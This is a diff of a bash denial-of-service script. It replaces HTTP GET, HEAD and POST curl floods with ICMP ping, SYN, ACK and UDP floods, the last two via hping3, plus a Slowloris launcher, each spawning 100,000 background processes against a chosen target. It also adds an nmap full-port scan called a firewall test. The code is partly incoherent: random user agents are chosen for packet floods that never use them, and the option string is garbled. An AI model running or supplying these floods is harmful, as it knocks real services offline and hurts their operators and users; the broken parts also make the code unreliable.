@@ -1,4 +1,4 @@
-    #!/bin/bash
+#!/bin/bash
 
 # Color definitions
 RED="\e[31m"
@@ -56,6 +56,7 @@ show_help() {
     echo -e "  -P     Specify packet delay (in ms)"
     echo -e "  -l     Perform Slowloris attack with automatic installation detection"
     echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
+    echo -e "  -F     Test firewall"
 }
 
 # Scan for open ports and handle attacks
@@ -72,60 +73,89 @@ scan_ports() {
     fi
 }
 
-# Load user-agent list from a file
-load_user_agents() {
-    local file="user_agents.txt"
-    local count=0
-    user_agents=()
-    while IFS= read -r line; do
-        user_agents+=("$line")
-        ((count++))
-        if ((count >= 100000)); then
-            break
-        fi
-    done < "$file"
+# Function to read user agents from the file
+read_user_agents() {
+    user_agents_file="user_agents.txt"
+    if [ ! -f "$user_agents_file" ]; then
+        echo -e "${RED}[-] User agents file not found: $user_agents_file${RESET}"
+        exit 1
+    fi
+    mapfile -t user_agents < "$user_agents_file"
 }
 
-# Function to get a random user-agent from the loaded list
-get_random_user_agent() {
-    echo "${user_agents[$RANDOM % ${#user_agents[@]}]}"
-}
-
-# Function to send HTTP GET flood
-http_get_flood() {
+# Function to perform ICMP flood with user agents
+http_icmp_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP GET flood on $target with 100k user agents${RESET}"
-    load_user_agents  # Load 100k user agents
+    echo -e "${CYAN}[*] Starting ICMP Ping flood attack on $target${RESET}"
+    read_user_agents
     for ((i=0; i<100000; i++)); do
-        user_agent=$(get_random_user_agent)  # Get a random user-agent
-        curl -s -X GET $target -A "$user_agent" &>/dev/null &
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        ping -c 1 -f -t 255 $target > /dev/null 2>&1 &
     done
+    wait
 }
 
-# Function to send HTTP HEAD flood
-http_head_flood() {
+# Function to perform SYN flood attack with user agents
+syn_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target with 100k user agents${RESET}"
-    load_user_agents  # Load 100k user agents
+    echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
+    read_user_agents
     for ((i=0; i<100000; i++)); do
-        user_agent=$(get_random_user_agent)  # Get a random user-agent
-        curl -s -X HEAD $target -A "$user_agent" &>/dev/null &
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        python3 syn_flood.py -t $target -p $port > /dev/null 2>&1 &
     done
+    wait
 }
 
-# Function to send HTTP POST flood
-http_post_flood() {
+# Function to perform ACK flood attack with user agents
+ack_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP POST flood on $target with 100k user agents${RESET}"
-    load_user_agents  # Load 100k user agents
+    echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
+    read_user_agents
     for ((i=0; i<100000; i++)); do
-        user_agent=$(get_random_user_agent)  # Get a random user-agent
-        curl -s -X POST $target --data "data=payload" -A "$user_agent" &>/dev/null &
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        hping3 -A -p $port $target > /dev/null 2>&1 &
     done
+    wait
+}
+
+# Function to perform UDP flood attack with user agents
+udp_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
+    read_user_agents
+    for ((i=0; i<100000; i++)); do
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        hping3 --udp -p $port $target > /dev/null 2>&1 &
+    done
+    wait
+}
+
+# Function to perform Slowloris attack with installation check
+check_and_run_slowloris() {
+    target=$1
+    echo -e "${CYAN}[*] Checking if Slowloris is installed...${RESET}"
+    if command -v slowloris &>/dev/null; then
+        echo -e "${GREEN}[+] Slowloris found! Starting Slowloris attack on $target${RESET}"
+        read_user_agents
+        for ((i=0; i<100000; i++)); do
+            random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+            slowloris $target --port $port &
+        done
+    else
+        echo -e "${RED}[-] Slowloris is not installed. Please install it using either 'git clone' or 'pip3 install slowloris'.${RESET}"
+    fi
+}
+
+# Function to perform firewall test (using Nmap)
+test_firewall() {
+    target=$1
+    echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
+    nmap -p- --open --min-rate=5000 -T4 $target
 }
 
 # Main function to handle user input
-while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:" option; do
+while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:F" option; do
     case $option in
         u) target="$OPTARG";;
         p) port="$OPTARG";;
@@ -139,8 +169,9 @@ while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:" option; do
         n) num_requests="$OPTARG";;
         H) custom_headers "$OPTARG";;
         v) verbose=1;;
-        l) slowloris_attack "$target";;
+        l) check_and_run_slowloris "$target";;
         t) attack_type="$OPTARG";;
+        F) test_firewall "$target";;
         *) show_help;;
     esac
 done
